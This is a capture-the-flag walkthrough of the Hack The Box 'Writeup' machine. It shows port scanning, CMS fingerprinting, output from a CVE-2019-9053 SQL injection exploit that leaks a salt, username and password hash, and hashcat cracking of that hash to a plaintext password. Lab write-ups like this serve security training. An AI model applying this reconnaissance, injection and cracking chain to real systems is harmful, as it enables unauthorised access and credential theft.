# Writeup
<img width="226" height="103" alt="image" src="https://github.com/user-attachments/assets/1ddc341c-676b-4e8f-9638-9e1dda812546" />

```bash
sebastianrojas@sebas:~/HTB/writeup$ nmap -sCV -p22,80  10.10.10.138 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-19 11:42 -05
Nmap scan report for writeup.htb (10.10.10.138)
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/writeup/
|_http-title: Nothing here yet.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<img width="776" height="320" alt="image" src="https://github.com/user-attachments/assets/602c723a-aed2-4db5-9da1-0a914cc8b0d4" />

```bash
┌──(root㉿sebas)-[/home/sebastianrojas/HTB/writeup]
└─# whatweb http://writeup.htb/writeup/index.php
http://writeup.htb/writeup/index.php [200 OK] Apache[2.4.25], CMS-Made-Simple, Cookies[CMSSESSID9d372ef93962], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.138], MetaGenerator[CMS Made Simple - Copyright (C) 2004-2019. All rights reserved.], PHP, Title[Home - writeup]
```
<img width="652" height="211" alt="image" src="https://github.com/user-attachments/assets/902d9d14-97aa-41d3-a92f-aac7377f1adf" />


[CVE-2019-9053](https://github.com/deadgirlerg/CMS-Made-Simple-2.2.10---SQL-Injection/blob/main/README.md)
```BASH
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7  
```

| Hashcat mode | Algoritmo         | Fórmula                  |
| ------------ | ----------------- | ------------------------ |
| **0**        | MD5               | MD5(password)            |
| **10**       | md5($salt.$pass)  | MD5(salt + password)     |
| **20**       | md5($pass.$salt)  | **MD5(password + salt)** |


```bash
Possible Hashs:
[+] md5($pass.$salt)
[+] md5($salt.$pass)
[+] md5($salt.$pass.$salt)
[+] md5($salt.$pass.$username)
```

```bash
sebastianrojas@sebas:~/HTB/writeup$ hashcat -m 20 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --show
62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9
```
